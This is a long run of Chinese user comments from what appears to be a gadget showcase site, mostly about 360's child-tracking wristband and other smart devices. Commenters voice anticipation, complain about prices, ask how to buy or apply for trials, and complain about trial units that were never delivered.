希望有机会试试
感觉很神奇，真的可以做到吗？
期待 送媳妇 呵呵
期待中，坐等试用
期待，和同事们炫一下。做好智键的宣传
期待啊，很好的创意
期待啊！！！！！！！！
等待ing
期待啊啊啊
非常期待啊！
等待ing
怎么还不能使用。。抓死了
请看通知，是今天上午10：00
试用窗口那 抓狂中 ....
不是3月7日试用吗？怎么还没动静啊！
0点了 试用窗口呢
不支持苹果 我在淘宝已经买了一个用上了 还不错
期待中。。。。。。
等待。。。。。。。
估计不支持苹果吧。
试用在哪里 啊？？？？、
支持苹果的么？
360的产品都不错，支持360你永不后悔！
希望早点上市，很希望买一个这种东西，价格要便宜
这个确实非常有创意，而且市场空间非常广阔，几乎所有的手机用户对此都有需求。当然，这个产品还有非常广阔的空间： 1、是否可以加入指纹识别功能？ 2、是否可以加入健康监控功能？ 3、是否可以加入数据传输功能，如NFC、蓝牙，两个插了智键的手机只要互相碰一下智键就可以相互建立连接、传输数据？
赶紧上市，等不及了，期待能支持所有的安卓手机，当然也包括我所用的红米手机！
有创意！期待更新产品的出现
喜欢有创造性的公司。鄙视那些喜欢抄袭的
基本都是360的东东，360wifi，电脑手机上36杀毒，安全卫士，360云盘，360浏览器，360桌面，还有360儿童安全桌面，还有什么反正都360了期待360在出好产品
请问在内个耳机孔的位置怎么可以往下摁呢？
好想要！！
有合作意向貌似可以发邮件啊。qikoo@360.cn
可以与360合作开发新型机吗
很想成为智键的第一批使用用户，期待智键有好的表现。
这个必须支持！
支持@！希望 能够给大家同城帮 商家带来一次机会。
很好的创意，不清楚app的实现形式，如果app需要一直后台，那么对于我这样经常清理的后台控还是有点小瑕疵的，相对而言作为一个设备存在不需要后台程序一直运行就更好了。这东西很是实用，单独卖貌似吸引力有限，作为随身wifi的配件也不错。
期待一键启动相机拍照功能
希望可以看到更多延展功能 例如：可否手机一键清理内存垃圾、一键锁屏或者开启省电模式等等，这些用户不方便的使用场景其实是最为关心的用户痛点..
大爱，不过我最想解决的不是拍美女时调相机太慢，而是怎么拍比较自然……如果抱着单反的话妹子肯定会很开心的让你拍，但是拿着手机就不一样了"o(
有思维太牛了快快出世就发达啦
好。比花图软件方便多呢
怎么试用啊？
希望可以得到试用的机会
外观精巧 可爱
开了wifi功耗小不了，U盘的身材电池大不了，有了无线单单一个共享功能有点少，所以功能是不是有点鸡肋啊，相比之下更喜欢现在几十块钱雷凌5350方案的wifi路由和移动电源合体的方案，路由、3G、U盘共享全搞定，一百多的价格还算靠谱。
这个玩玩还可以 安全还是问题
小偷把电子设备撬坏或者砸几下应该不是很难吧，毕竟是电子设备。
对于国内的偷车贼来说这算个事儿么？
蓝牙是不是有距离限制的？
没IPHONE怎么办
iphone没电怎么办？
很牛的样子，要是能根据数据加上自己添加的更多表征，给个大概的健康判断和建议就更好了。
血压测量能准确吗？
这么小，牛！
如果在运动当中也能继续充电就够OK了
第五张有亮点
玩的东西，挺好，太贵了，就是。。。电池始终是个问题啊
这个赞 就是电池容量太小了吧 考虑下tesla的18650电池吧
不错喜欢！
体积大了一丢丢
在拍摄时，自己在运动，会不会被别人拿去了？
很漂亮,早点产出来吧
在哪有卖啊　快做出来吧　想买个
能干些什么？
请个设计师把外形好好设计下，这个外形实在不咋的
阿斯蒂芬阿斯蒂芬
这个多少钱?
希望可以试用看看物品性能
没有显示 ，你让人家怎么看你。。你戴上的到底是什么东西啊！！！那么丑
如果上面在加上一层显示屏，显示时间当做手表用，那更加赞了哈~随时随地娱乐
好吧，很好奇戴着这款产品出去人家会怎么看。
手怎么这么黑？
可爱物品 希望试用
好方便的，快一点出
期待啊啊啊啊
就是不晓得毫安多大 ，够不够用
希望可以试用
这个创意不错 希望厂家配的线 就是这种 多方便啊 买的人肯定也会很多的吧
是感觉挺不错的，就是不知道能充电多少次
挺不错的耶
这个是相当不错哦~
好小巧哦，很喜欢！
喜欢唉，好可爱
好可爱的造型~~~~~。
不错噢噢噢
好可爱的造型。
现在大部分家庭都已经光纤输入了，这种端口的路由器还能用么。
看样子不错
牙医建议3个月换一次牙刷怎么办？
有点贵了~~
可以换刷头就好了
牙医建议3个月换一次牙刷怎么办？
Pebble大胆的创造，看了好多智能手表还是觉得Pebble才能算是真正适用与日常的穿戴设备。期待中...
这个不能看时间吗
沙发！哈哈！不过说实话这东东有用么？手表就是用来看时间的！亲！
能不能试用呀出来的时候？
有了它，就不用翻箱倒柜找东西了；不用发愁丢掉东西，落在那里了。
看起来很不错的样子
噢耶！！好喜欢
哇，真的很不错啊。
可以实现吗
智能家居时代的到来，相信未来五年内会快速发展并且得到普及的、
这个非常不错！
外观可爱 物品小巧 希望可以试用
变电动自行车？
"油门"怎么控制?
太赞了，这高科技玩意估计普及的话不知道要多久
弱弱的问下这个怎么刹车呢
哎呦！这个产品不错！保密性咋样？
求个联系方式！
万一手机没有电了呢？是不是就直接关闭了。
有谁用过，来说说感想。
这东西实用吗
是真的话,我好想买..
好好好好好好好好好!
希望可以试用
介绍的不错 价格怎么不显示呢
我很想知道它需要多少钱
还真强大，望早日上市。
很好很强大
期待啊！特强大了
想要黑色的　显示表时针的图要是多点就好了　可以有的选择
有没有摄像头？
好想要啊,就是有点小贵啊~
太贵了,999元贵...
怎么买啊.
看起来还不错
太贵了，环保是好，价钱接受不了
现在在北汽工作，正在学车，有一辆就好了
25万，那可以买我们中国的5俩高级电动轿车
中国人 有钱。
因为坑所以坑。敢情你能不能再坑的深点
国家应加大补贴力度，大力发展纯电动车，降低关税等
太贵了。。本来电动车做出来就是让人少开汽车少污染，你这预定都25W的谁还敢买？75W能买多少台奥拓了
75W那么贵，买A6也多油钱。
希望国产车能尽快研发出来供应国内，免的一大堆的税让人可望不可买。
75w 100w
真贵...
七十多万的价格和一辆奥迪差不多 真的走进生活了
这tm不带便宜的 ~~~
唉哟，不错哦～
买一辆 喜欢黑色的..
能做的和耳机防尘塞一样大。再加上不影响来电铃声和手机通话，那样就完美了，可以常驻在手机上面。
不错哦，很喜欢。
没想到这么多人点喜欢，创业不容易，理应支持。
要是钱包和手机都不见了还能知道钱包和手机在哪呢？还能听到和控制钱包或手机吗？
我天，太凶残了，快找人删掉这个网页，不能被老婆看见
蓝牙只有一个WLAN就好了
已经和gear连接了还能连接这个吗？
太高端，低端手机用不了啊
不错的好东东！
请问楼上的美女，你在哪里买的？
给我的感觉还是比较不错的
很好很实用！
喜欢 很不错的阅读类产品..
。。。。。
你告诉我 什么键盘没有ctrl键？贴个标也算创意？
敲键盘声音不知大否(ˇ?ˇ）
有创意！！！！！！！！！！
怎么买这产品啊，这里的好多产品都不能买，那还标示可以买？？？？？
不错，全触控家居。。。。。
的范德萨发
我也申请了 希望可以通过试用 非常喜欢这个智能遥控
希望能够通过试用申请，看着周围同事的Galaxy s4的遥控功能好羡慕，在家里就能控制所有的家电了。求通过啊~~~~
好好玩啊，很期待
期待啊 好想买一个
期待啊 好想买一个
自己在京东买了一个，要配合智能插座，功能才强大，总体来说功能一般！
希望能够提供试用样机啊，让大家长下线，顺便检验一下产品质量。
瞬间高大上了的感觉~~
是不是接收器连接不同插座,从而通过控制插座开或关而达到遥控各种电器的目的?
应该不用，直接就能接收
这里的电器是不是要求品牌或要安装接收器什么的才能够使用这个产品
这个都能控制啥，市面上的电视，空调，音响，直接就能控制？
基于wifi模块 样式很新颖 将来有没机会做成路由器呢..hh
nfc技术对于未来发展的重要性值得商榷 新增的蓝牙4.1我看倒还挺有来头
细心人 哈哈
这个标题错了吧！应该是智能水表。。。。。
话说，这款电源的电源键几乎是摆设，因为一连上手机就会自动充电，不需要按电源键。。。
话说，这款电源的电源键几乎是摆设，因为一连上手机就会自动充电，不需要按电源键。。。
话说，这款电源的电源键几乎是摆设，因为一连上手机就会自动充电，不需要按电源键。。。
话说，这款电源的电源键几乎是摆设，因为一连上手机就会自动充电，不需要按电源键。。。
怎么还是显示创意中呢，我都在小米官网上抢到了，现在都用上了，感觉还可以
可以买个回来看看
个人感觉空气检测这个市场长远看还是相当有需求 而且产品面向大众 家庭 健康 很有吸引力
要是有这样的小玩意儿，一定会买一个，太实用了！
小米4不知什么时候出来呢！
只有连接苹果手机才可以用吗 别的安卓手机可不可以用
怀孕家人最关注的是安全，这新鲜玩意安全性能要保证啊！
看着很不错的产品，连接智能设备测胎心，不知道那催眠曲有用没有
上次在MDCC上见到这款产品，手感不错，包装也是很漂亮
终于有关注女性的酷品了，外形还真是酷中不失可爱。孕妈妈们也可以怀绅起来啦・・・・
好可爱呀 是测胎心的？
同学怀孕了，正在发愁不知道送什么呢。刚好可以送这个，果然够新奇，够酷！
把胎心探头和iphone连接起来，很新潮的点子啊，好创意。探头曲面很漂亮，工业设计是下了功夫，互联网公司能做到这个水平，不容易。App界面还不错...
功能挺多的，东西也挺好的
赞一个，很时尚的东东。准妈咪值得拥有！
外观精致，大气，功能全面，特别是分享功能非常好.
是的，就是不知道价格怎么样
这个很不错，很实用，对于食品安全和跟进非常有用，避免乱加东西。
感觉不错啊
我买了Z Watch用过，电池坑爹。没有想象的好，还不成熟，购买需谨慎。
期待期待，希望不要太贵。。。。
好像能打电话　要是能打电话就利害了　对着手表说话哈
要多少钱呢！
不知！要多少钱呢！
确实华而不实！
多少钱？感觉华而不实
已经买了。
期待已久 玩家必备精品呀！！
怎么预定啊？
预订了什么时候可以买
怎么预定，很吸引！
加了时间防水就很麻烦了，这样成本直线上升。
很棒的创意。
我觉得可以让他有时间显示更好
什么时候能有卖的
如何预定啊
好想要啊 好东西呢
好东西 啊
好想要啊 好东西呢
我爱运动，也爱睡懒觉，当然是因为起不来了啦~~求一个实用实用！
非常想体验一下
好东西 期待！
期待.怎么预定？
什么时候可以预定？价钱是多少？
好东西不错
啥时候上市
如何预订呢？
好期待的说。。。
这个怎么预定啊？
同问，怎么预定？？？？？
怎么预定，多少钱啊
qidai
什么时候能预订啊?好想要啊。
怎么预定呀
很期待能够预订到这款设备。。
酷，光带着就好看
没法预定阿
迟迟发不了货的那个
点击“我要预订”进入官网查看呢..
怎么预定啊
4S可用不？
支持啊 力顶
哈哈 看来找到组织了..
这个必须会买，深度paper用户
喜欢不错，自己看得懂别人看不懂！
智商捉急，怎么看了示例没懂怎么看时间……
见过一个三星的同类产品
都是好东西啊//
外观还是不错的，比较适合小女生
外形很酷 价格也还可以 期待！！
这个刻印和ps同步么？如何进行的
希望马上可以得到啊
什么时候能买，什么价格
哇哦，好棒，样子多一点就好了
好像很厉害的样子。
不错不错，不过外观不是很好看
这个貌似功能强大一点...
真是太贵了
36个小camera，价格一定不便宜。
摔坏了怎么办……？
这么个小玩意 外形挺酷 售价多少？
价格是硬伤啊。。
这个网站不错..好多新科技东西..
常在 哈哈 对这些奇酷玩意相关喜欢..
一楼是谁？常在？
时尚大气，价格没优势，还是要插电的，下次设计个不用插电的那更牛X
不错 这个小玩意到时很能解决问题 性价比设计很好..
要多久可以出来？
听什么人说 这个像国内红米。。
真的，不好看
廉价版的moto x 配置中档
价格也还OK吧
嗯，蓝牙是算是一亮点吧
这东西质量不行，我这边坏的有3个。
除了蓝牙传输外 似乎并无亮点,,
白色的真难看
我喜欢，现在那里可以买啊
都不错啊！好想要
可以先测量再在手机上读取数据的，但还是希望可以实现快速测量的
我觉得这个温度计的设计有点画蛇添足，不适合生产出来，因为手机太大，温度计要夹在腋窝，不方便
如果这款产品不能够在数秒钟内完成准确的体温测量操作，估计就不太适合给孩子用了，至少不致使给我女儿用。
这得多少钱一个呀，要是贵了可不合适
就等这个了！！！
挺不错的创意。看视频介绍前就想是不是一个窗户贴一个，果不其然。要是一个窗户分几块玻璃的话那么一块玻璃应该贴一块吧？那么美观和价格就该考虑了。
牛，酷，神
神器啊。什么时候发布
酷酷酷COOL！！！
我就想问一句，生完娃以后再拿来干嘛呢？可不可以拓展其他的安卓应用程序呢？
我还是认为Xbox360好
中国这么慢？我这都开始卖了
早在二月份就召开的发布会 现在终于快上市了..漫漫等待 真是长。。
同意，不够酷奇
样子很一般
样式很不粗 话说 这个东西貌似太文艺了 不够酷,,
支持微信么？
@明爽，你打算买哪个颜色的？
想入手黑色一只！
颜色很不错 又加了ios更新 总体还算满意..
穿墙能力不知好不好
穿墙能力 如何 ？
从哪里能够买啊？？？？
2什么时候可以买啊？
产品质量不得而知，这样的营销，定位是失败的，这个产品再这样下去，没有未来
还是1s比较实惠 2要等到年底吧？
感觉1s还不错 性价比高！
怎么不能购买
问一下，什么时候能够发货啊？我已经定了一个啦。
bucuoei
超酷啊，值得拥有<"
dddddddddddddddddddddddddd
同求！！有没有android 使不了呀
很不错的创意 希望可以推出android版呀..很想试用一下
不是说柔性墨水屏很省电的么
居然不支持gps
能直接插卡和嵌入GPS就好了
如果是蓝牙手表就不用出了。
和之前的宣传图还是有一定出入，先下载个模拟器试试
期待黑色啊 男孩还是黑色好看啊
期待快得发售
黑色好看..
这个好看！
期待！！黑色的
线充也一样充电 多此一举 奢侈品 不推广
淘宝上已经有这样的卖了好不好，，，，，，，也不贵100不到
这个不错 可以推广呀..
好蛋疼的设计
创意很好 希望价格不要太高..
希望早日出产品， 早几年看到电热转换芯片时，就产生这个想法了。
这个杯子太棒了，真想马上买一个，就是不知道贵不贵。
第一感觉是好，第二感觉是很贵
话说这二代跟一代有啥区别呢？？
不知在第二代中对于近视镜人群的适配会做出如何改善
看不出端倪..
感觉蛮酷的 很好
360越来越有意思，关注可穿戴产品的研发推广，不过挺符合这家公司特性
看错了，是儿童卫视在免费试用
骚年，这个东西貌似正在免费试用吧
360 一直支持你 好样的
要是能免费试用就好了~
希望360在儿童保护中多发创意，会得到我们这些年轻父母们的大力支持！
我感觉 360越来越有创意了！！！360真牛
带上给别人看的意思吗？
感觉华而不实 这个..会有人戴上么
撒打算打算
哇哇，太厉害了・・
下雨了可能会触电！~
哇 这个东西酷！就是真的会有人戴上去么，，我觉得可以买个收藏 蛮酷
就是EPSON的玩意儿，早玩过了
我希望360入手3D网络游戏和3D游戏眼睛的开发。现在国内还没有这样的游戏。即使是单机的3D游戏也行
这个已经出了好久了，不是吗？还创意中？
确实有点贵了啊
太贵了……
第一次沙发。。。。。。。。。。
好玩././
这玩具车有啥用啊
感觉还蛮酷 听说小米之前也出了一款遥控汽车还带摄像功能，，
杯子的容量、机械性能(冷、热、冲击...）和化学性能（能装啥？不能装啥？析释有害成分么？）没有介绍，怎样日常维护（清洗...)。
我靠！水瓶都快有智能的了，现在的技术也太牛了吧。
不错，不错
感觉很不错。。
看着不错呦
为什么平板非要WIFI才可以？
希望联想做的产品越来越好！！
太棒了！我要买啊！！
希望国产的东西能走在世界前列，或引世界潮流！支持国货。
希望自己有机会尝试先
该更新了,中国都发布了..`
喜欢这款产品，我觉得从平板的发展角度，最终还是会像娱乐+移动办公的需求结合买进，现在的苹果系列仅能满足娱乐阅读需求，但未来随着pc轻薄化的量减，属于移动办公平板的市场会越来越多！！
号起床刷微博才知N5已开卖，上班路上便迫不及待的用手机挂vpn下单，庆兴的是google提前4号发了货。悲催的是没选13.99的快递，再不幸的是遇上坑爹的x雷转运，辗转20天才到广州海关。。
喜欢 这个配置加价格海淘吧！！
速度啊，什么是开卖~
屏幕太小了吧，应该超过5寸
快点想想办法啊
为什么没有在中国销售
大约能多少钱呢？？？？好期待！！
蓝牙？？距离？？
如果能控制在10美元以内，绝对大卖。价格很关键。
360我喜欢、能在便宜点吗？？？
我最爱360！！！好期待...不是太了解它怎么用...
我喜欢，感觉非常好，喜欢360！
车还在，锁丢了。
非常喜欢这款锁，可是价格叫人接受不了。
两千多的车，再配一个一千多的锁，放外面更不放心啊！！！
真贵。锁被扔了，一样追踪不到。意义不大。
太贵了吧！
只支持IOS系统么？ANDROID系统的呢，也支持么？支持的话来一个
这个东西不错，环保和健康人士必须关注。。。
Good！
期待中。。。。。。。。。。。。。
200多美刀有点贵了
不知道待机时间多久
好喜欢，几块啊？
不好意思，发错地方了
没看明白，儿童能不能打电话向家长求救？
要SIM卡才能用吗
是啊，看起来不错，期待中。。。
看起来很不错啊
应该是NFC传送数据的吧.
很神奇的宝贝，将来必火
私密会限制它的使用, 可以设置为不显示就完了, 老人和小孩就用不了了
@明爽，入手了借我玩玩= =
还可以，还可以
1000块钱？直接忽略！
外形很炫酷 就是不知道国内的价格如何..准备入手一款
试用不通过，那到底何时可以买呀？期待中。
结实不结实，如果小男孩佩戴会不会在玩耍的时候容易损坏
希望增加过红绿灯时候自动提醒功能
真的好，孩子有点路痴，我女儿的05.08号生日快到了希望能得到
真的好想要
现在还有活动吗？我女儿的生日快到了，我想把这个作为生日礼物送给她，让她知道爸爸妈妈时刻保护她。
什么时候可以购买到？
感觉非常好,什么时候出来啊?
当我看到的时候，已经停止申请试用了，我想送给女儿做生日礼物
什么时候出售啊，，等不及了，，
什么时候出售啊，，等不及了，，
什么时候出售啊，，等不及了，，再不出我就买别的牌子的了，，哎，
什么时候出售啊，，等不及了，，再不出我就买别的牌子的了，，哎，
在不发布，我儿子马上就走丢了
在不发布，我儿子都上小学了！
非常好 第一时间我先买一个
很好 第一时间我要弄一个
我要参加，亲
手环今天下午感受到，从外观上看很不错，但是开机试用了一下定位不准里我家里差两条街呢！不知道是因为在屋子里还是手环的问题，明天出门在试一试。
11日发出参加试用资格，手环已经通过EMS寄出，因为短信上没有快递单号，无法查到手环到了哪里，通常深圳到我们这里早就到了？？？？？？？？？？？？？？
这啥时候能批量上市啊？
这啥时候能批量上市啊？申请也通不过，o(
有申请成功的可否借来测试一下，本人淘宝天下周刊编辑，来回邮费我出，测完寄回。有愿意的联系旺旺：良牙_tbtx
申请的诚意有了，但是筛选的结果让人失望。。。。
拐卖儿童的都该枪毙
我应该是年前就获得了资格，还发了验证短信，后来说将在12月中旬开始陆续寄出，可是到现在我还没收到呢，不知道该怎么联系啊。
需要用到SIM卡吗？是什么方式上传位置资料呢？
今年就需要用到，什么时候能够上市！
电池待机时间正在测试中呢，估计两天后就有结果了。
试用的朋友，说一下电池能用多久？
一支都没有资格。真的好难买。
已获得资格，期待测试
怎么申领呀？期待啊
能具体定位到10米以内的话。绝对是个强货。。期待中。。。。。。。。。。。。。。。。。。。。。。。。。
还有申领吗？什么时候发售啊！
颜色单一了些。
我想买呀不知道卖不
怎么申领？
呵呵，小宝宝刚刚学会走路。就爱串门子，有个360儿童卫士手环很方便很安全。。期待发售！！！
还是没申请到~哎~~~~~~~~~~~~什么时候发售啊？哥出钱买行不？别吊大家胃口了
为什么？这是为什么？申请MB两次了都没成功。
期待快点发售!!
从一开始发布我就在等它上市开卖，等得我脖子都长了，它就是不开卖。哪儿有申请试用的，我就上哪儿申请，可它就是不让我通过申请啊。唉直接开卖了吧
想安装在高端的自行车上面，防止被盗。当然成本，可靠性，稳定性，小体积（安装后不会被小偷轻易发现）很重要。
手环什么时候能购买啊，太喜欢这东西了，非常非常非常想拥有这个小东西，我是一位单身妈妈，孩子他爸在孩子四岁的时候出车祸去逝了，现在孩子是我唯一的生命，每次孩子稍微晚回来一点点，我就怕的不行，急的要疯，有这东西我就可以安心的在家等孩子回来了，期待期待快点发售
为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！为什么没选我！！
在右上角有个我的试用可以看到的
上次申请的时候说3月10号查询申请结果，但登陆后根本没有任何查看申请结果的入口，你们是忘了这事了？
好东西为什么不开放购买啊，试用结果也没出来
支持关爱360儿童卫士，这360安全环真是爸爸妈妈的福音，这样孩子出门大人也好找，要是能买到我也想买。我也希望能被选中。谢谢~！
支持360关爱儿童，这是360安全环是爸爸妈妈的福音。这样孩子出门大人也放心，希望自己能被选中~！有卖的也想买一个，谢谢~！
通过马航事件我想知道在飞机上是否可以使用？是不是和一般手机一样，在飞机上应该关闭儿童卫士，因为会对飞机通讯造成干扰？
每天看一次奇酷网，只为体验360安全手环！爸妈的福音！
什么时候还有免费试用？什么时候开放购买呢？
好东西一定要顶，希望第二批能选中我，我家有个可爱宝宝，上次差点走失，看来360儿童卫士是必须品呀，希望能被选中，谢谢
你们有没有想过如果孩子打篮球时或是做其他运动时手环会不会伤害到孩子的手腕或者其他的部位，还有手环可以调松紧吗？
有了这个小孩出去串门也好找啊，好东西
这个真是调皮宝宝家长的福音啊
手机端悬浮层一直挂着望改进，安卓
来一个，这个必须用上
什么时候可以买啊，很想给我家调皮的宝贝买一个。
要买啊 必须的！
哪里有卖啊？
免费使用没有赶上，好可惜啊，好像要，好需要啊
想买！ 哪里有卖啊？
免费使用没有赶上，什么时候正式上市啊，我需要啊，急切等待
支持360关爱儿童
一直关注此产品
一直关注此产品
希望申请给那些有需要的人，我以平常心对待。如果未申请成功，我就只有等了。我只希望给那些有帮助的人，给那些孩子帮助，特别是留守儿童。可怜天下父母心。
支持360儿童卫士
一直关注此产品，赶紧完善，我好买。。。。
正式上市没有，想给我宝宝买一个
支持360儿童卫士支持 支持， 支持
对于这款产品，理念跟出发点都是极好的。但就实用性来讲，现在的小孩个性都很强，他们会希望亲人每天无时不刻的监视自己吗？哪怕是小孩子。
时间到了，结果呢，急死人
快点快点等不及了，真想马上拿到手啊
这款价格多少钱？
支持，很吸引人的看宝神器！
我看评论有人收到了，我也有试用资格，也收到短信了，就是没收到货，也没有任何回复，请给个答复，360
我也申请免费试用成功了，一直没收到，而且也没有任何答复
偷偷帮女儿买一个，不要让老婆知道，要不然还得给自己也买一个。
我收到短信是2013年12月中旬陆续寄出，可是一直都没收到任何消息，请问怎么回事？
这个不错，希望试用里能有我
这个真是很不错，作为人父的我，大爱！
超级喜欢这款产品啊
有人拿到申请了吗
好。我也想要。
在哪儿申请呢。
什么时候可以买
在哪儿申请呢
怎么翻遍全网都找不到免费申请4个大字~~~难道是用360浏览器的原因？
死活找不到 免费申请 在哪。。。 真失败。。。
想给我外甥女申请个，姐姐她们都不在家，两位老人在家照顾孩子，现在社会太复杂了，特别担心孩子的安全，希望能给孩子更多一层的保护
今天开始吗？在哪里申请啊亲
奇酷的试用频道2月25号就要开始了，希望能有好运。
非常希望能够得到 申请试用
想给我外甥申请一枚, 小外甥就我妈妈帮带,妈妈年事高,身体力行当然跟不上5岁调皮的外孙, 现在人贩子多,稍不留神就容易被坏人得逞,孩子一旦丢失找回来更是犹如大海捞针, 希望能试用该产品, 好用的话就花钱购买,顺便送一些给亲戚的孩子
申请表在哪里呢
怎么申请，在那能买到？
怎么申请试用啊
怎么申请试用啊？
什么时候能收到呀？女儿激动了二个月都没，已经骂我大骗子了，你们得尽快给我澄清呀！
我收到短信是2013年12月中旬陆续寄出，可是一直都没收到任何消息，请问怎么回事？
我的什么能到啊。
产品已收到。包装很好。接着试用。。感谢360.。
收到短信了。22日开始发货。感谢。。。。期待。。。。
怎么回事？说着玩呢？还是玩不起呀？拜托，这等于伤害感情呀！算算这是多久的事情啦？360这么大的企业，请问信誉有吗？不送还是怎么回事？总要给个信息吧！360
11月份说是12月份发货，12月份说是过了元旦发货，现在又说是年前发货，是不是过几天就要告诉我们说是明年年底前发货了呀。360的等待伤不起啊，一等就是360！
已经有人收到短信！22号发货！
周总 什么时间能收到安全手环啊，是不是在路上啊，不要告诉我又是一次炒作。
收到试用名额了 还没有收到货 。。给个回复呀。
啥时候才能收到手环呀？我这儿是日盼月盼呐~
很早就收到短信，但是还没有收到货。。。马上过年啦。。
周总，我儿子想马上戴你的手环，说话算数哦
儿童卫士哪去了？
明天就1月1号了，孩子等的不行了，怎么还没有寄过来呢
光告诉我收到了试用名额 就是收不到货呀 好着急呀
都捉急了啊。我也捉急，眼看到2014年了。下月20号左右要回老家呢。
我也还没有收到！
我收到了试用名额，还没有收到儿童卫士。求解释。
到现在了还是没有收到试用的儿童卫士啊，求联系方式，求解释，抓狂……
什么时间360儿童卫士可以寄过来啊，不是说在十二月中旬就要陆续寄出吗 ，现在已经下旬了。
亲，怎么到现在都没有看到，朝思暮想呀，什么时间到啦？现在也不知道怎么查询？
想问一下，不是说十二月中下旬发布上市吗，今天已经25号，还没有消息呢？！
烦请给一个 客服号码，问问儿童卫士走哪了
怎么也没有一个客服电话啊，获得了试用名额，怎么到现在还没有收到啊，物流很不给力啊……
期待试用,早点来哦
等的心焦啊，期望不要》》》》》》
产品什么时候寄出，期待中，请问寄出的时候，能短信通知一下吗？期待。。。。
我也在想，中旬寄出，都到下旬了，还没收到。是不是在路上了。特别想她
期待中，期待新年大礼。期待360带来好的运气。期待360走的更远
不是试用品中旬寄出吗？怎么还没收到啊，一看到快递都两眼发光，您能走快一点吗？
不是试用品中旬寄出吗？怎么还没收到啊，一看到快递都两眼发光，您能走快一点吗？
天天关注，天天等，什么时候上市呢！不期待试用了，只想早点可以买
很期待哦，不知道什么时候能收到。
申请通过了，什么时候寄来啊？满心期待。。。
期特试用，关注很久了！
期待，感觉不错
期特试用，关注很久了！！！谢谢谢谢
360越做越好！！！
不好意思/对不起/我搞错登录帐号了/成功通过了/非常抱歉
收到三次信息说获得首批试用资格/现在说没通过筛选/逗我玩是不？/没有这样寻开心的/
该产品有没有报警和报警音功能？
相信360 一直在用360
在哪里确认哦
请问怎么确认啊，希望知道的朋友说一下？
这个做好了是利民的大好事
在哪里确认呢？
怎么确认啊
试用后需不需要还回去啊？？
期待试用品寄到，及时进行试和评测。
相信360的儿童卫士与360的软件一样好用可用
已确认 等待中，希望能带给孩子们惊喜 、
在哪确认啊？咋没找到呢
请问如何确认的？
外形很酷，颜色很亮，创意很棒，非常期待！
今天收到手机短信，晚上到网站上确认成功。感谢360.
怎么不知道去哪里确认啊，已经收到了短信。
我收到短信了但是今天登陆网站确认却说我没有被资格，请给我解释。
已经确认成功！感谢360！爱孩子不能嘴上说说，行动才是最好的证明。360让我对孩子的爱看得见。
相当感谢，等到试用后一定第一时间分享效果！
已确认，等试用成功后，最少要买五六个，送朋友！
我好激动呀，我竟然也能收到免费试用的短信，希望赶紧收到，好期待
43万的用户，居然能抽到我们。很是开心，期待手环到来的那一天。
实在实在谢谢抽中我试用，我一定会认真填写使用报告，让更多的家庭能享用到这产品。360加油，我太激动了，谢谢！
已确认 期待中 感谢360儿童卫士对孩子们的关爱
期待中。。。
收到确认短信了，好激动
请问哪里查询试用成功的名单
呵呵，收到确认短信。
期待中啊～～～～
收到短信啦，希望快快收到， 好给宝贝用起来。
坐等发货！！！！
收到短信了，焦急期待的等待中，呵呵
收到短信，静待发货
居然抽到我，有点小激动，期待使用
再次收到确认短信，很开心，很幸运哦~谢谢~~
刚刚收到短信了，期待中，谢谢
已确认！一定好好试用！让儿童卫士强大！
咩哈哈哈，我也来得瑟一个，从43.5万人中被选中，很荣幸。希望能尽快收到这个漂亮的只能手环。
已经收到短信。
收到确认信息，等待中。。。
哎，没有收到短信。。。。等着买
收到短信了，谢谢
收到短信了，坐等下个月试用，小家伙去学校就放心多了
哇咔咔~接到短信咯~~坐等试用~
收到短信了，真开心，就等下个月中旬发货试用了
我也收到短信了，那个激动啊
求购买链接 购买链接
必须为我弟买
如何申请阿
为什么我还没有收到。苦。。。。。。
期待中 谢谢360
收到短信了，感谢360
太开心了，我成功获得试用，感谢360，坚定支持360.360儿童卫士，360度的关爱！
收到短信通知，太高兴了，能成为首批试用特别开心。
我也申请成功，希望早一天试用
不错，付钱也要买的东西。
昨晚收到短信。。高兴呀。貌似我这显示是飞信发的。。。等待收货。。。评测。。。
我也成功获得试用啦！
今天收到短信，非常意外和非常开心，成为首批试用资格；此刻感觉真幸福，都好吧，期待中
什么时候上市啊？
你们心情好啊！恭喜你们！我们没收到却感到很失望。
今天收到短信，非常意外和非常开心，成为首批试用资格；此刻感觉真幸福，都好吧，期待中
刚收到信息使用成功，期待宝贝到手，可以感受一下！！！感谢360！！
今天收到短信我成为第一批适用客户 希望早日拿到小小高兴一下
收到短信了 这是最近唯一得到的好消息
刚才收到信息了，申请成功。感谢奇酷网，感谢360。好期待啊，不过要12月中旬才能寄出。
我刚收到短信，期待上手~~~~~
我也没收到，有延迟么？
我没收到短信，但是我还是要谢谢360，研发出这么好的产品，同时期待360儿童卫士尽快上市。
诶......没信息呢 为什么
想买都等疯了
申请了好多天了，怎么还没消息呢，我在新疆，信号不好，是短信没收到还是怎么，除了短信还有别的通知么，邮件什么的？这款产品是不是也可以给老人用呢。
我申请的怎么没有哦消息呢
好产品，就需要这样的企业，时刻想着人民，这样的赚钱才是好企业
我申请也好久了。怎么还没有回复呢？？
我昨天晚上收到 360的短信了。获得了首批使用资格。。。期待能尽快的拿到产品。。。
谁能回答呀?
我的怎么没消息啊?
申请时间已经过了哦 我晚上收到360的短信了，获得了首批试用资格。详见我新浪微博 @角落公爵
我获得试用资格啦，快快到手吧，期待中
进今天收到短讯通知了！获得资格了！
老早就申请了，怎么没有音讯了呢
小孩子好奇心较强，不知道这个耐摔打能力怎么样？
怎么申请？
我也很早就申请试用了，希望能通过，给自己的孩子戴上，既可以当作饰品又具有强大的功能，真心喜欢。
12312312312
我也申请试用了，希望能通过，好想见到他呀
嘿嘿也我申请了，希望能通过把。真心喜欢这个宝贝
早就申请了希望通过 谢谢
刚申请了！希望通过测试！！会提交评测报告的！！！
我也申请试用了不知道能不能通过了，什么时间开始批量销售呢
我很早就申请了，到现在还没有通过，360的这个产品真心喜欢，不知道现在有申请通过拿到产品的吗？很期待呀！
这货真不错。。
这个最符合我现在的要求，不知道能不能申请到试用。
我已经申请了，不知道什么时候有结果? 什么时候卖呢？申请不到买一台！
看来很多人申请，我有机会申请到么？？产品什么时候能投入市场销售？？
我申请通过，什么时候到货试用？
好东西，有这个东西能省不少心啊
